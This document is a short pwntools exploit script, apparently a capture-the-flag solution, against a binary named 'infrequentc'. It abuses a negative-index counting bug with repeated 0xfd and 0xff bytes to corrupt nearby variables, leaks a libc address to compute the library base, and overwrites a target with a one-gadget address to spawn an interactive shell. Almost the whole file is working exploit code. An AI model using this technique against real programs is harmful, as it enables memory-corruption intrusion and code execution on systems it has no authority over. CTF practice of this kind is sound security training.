from pwn import *
import time

exe = ELF("./infrequentc")
libc = ELF("./libc.so.6")
context.binary = exe

if args.REMOTE:
    p = remote("localhost", 1024)
else:
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p)
        time.sleep(2)

"""
'filename' is at counts[-1]
so we increment it 54 times using \xff (-1)

'largest' is at counts[-3]
so we increment it 265 times using \xfd (-3)
"""
p.sendlineafter("on:", b"\xfd" * 265 + b"\xff" * 54)
data = p.readuntilS("time")
print(data)
leak = int(data.split(" ")[8])
libc.address = leak - 0x21C87
info(hex(libc.address))

onegadget = libc.address + 0x10A2FC
# onegadget = libc.sym['exit']
p.sendlineafter("default)", p64(onegadget))
p.interactive()
